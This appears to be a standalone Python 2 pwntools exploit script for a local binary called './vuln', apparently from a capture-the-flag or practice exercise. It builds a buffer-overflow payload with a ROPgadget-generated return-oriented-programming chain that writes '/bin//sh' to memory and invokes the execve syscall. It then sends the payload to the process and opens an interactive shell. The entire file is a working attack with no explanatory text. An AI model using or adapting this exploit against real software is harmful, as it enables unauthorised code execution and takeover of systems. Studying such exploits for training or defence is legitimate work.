#! /usr/bin/env python2

from pwn import *
from struct import pack

# Created with ROPgadget
def get_ropchain():
    o = ('a'*0x18)

    o += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    o += pack('<Q', 0x00000000006b90e0) # @ .data
    o += pack('<Q', 0x00000000004156f4) # pop rax ; ret
    o += '/bin//sh'
    o += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
    o += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    o += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    o += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
    o += pack('<Q', 0x000000000047f561) # mov qword ptr [rsi], rax ; ret
    o += pack('<Q', 0x0000000000400686) # pop rdi ; ret
    o += pack('<Q', 0x00000000006b90e0) # @ .data
    o += pack('<Q', 0x00000000004100d3) # pop rsi ; ret
    o += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    o += pack('<Q', 0x00000000004499b5) # pop rdx ; ret
    o += pack('<Q', 0x00000000006b90e8) # @ .data + 8
    o += pack('<Q', 0x0000000000444c50) # xor rax, rax ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x00000000004749c0) # add rax, 1 ; ret
    o += pack('<Q', 0x000000000047b6ff) # syscall


    return o

raw = get_ropchain().encode('hex')
finished = ""
for i in range(0, len(raw), 2):
    try:
        finished = finished + "\\x" + str(raw[i]) + str(raw[i+1])
    except:
        print("oof")

print(finished)

e = ELF('./vuln')
p = process(e.path)
p.sendline(get_ropchain())
p.interactive()